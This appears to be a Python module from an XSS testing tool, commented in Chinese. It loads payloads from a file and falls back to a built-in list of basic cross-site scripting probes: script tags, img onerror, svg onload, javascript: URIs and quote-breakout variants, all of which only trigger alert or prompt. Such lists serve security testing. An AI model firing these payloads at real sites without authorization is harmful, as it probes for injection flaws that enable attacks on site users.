# -*- coding: utf-8 -*-
"""
XSS测试载荷模块
"""

import os


def load_payloads(file_path):
    """
    从文件加载载荷列表
    """
    if not os.path.exists(file_path):
        print(f"[!] 警告：载荷文件不存在 -> {file_path}")
        return []
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return payloads


def get_builtin_payloads():
    """
    获取内置基础载荷（文件不存在时使用）
    """
    return [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>prompt(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "'><svg onload=alert(1)>",
        "\" onmouseover=alert(1)",
        "' onmouseover=alert(1)",
        "</script><script>alert(1)</script>",
        "--><script>alert(1)</script>",
    ]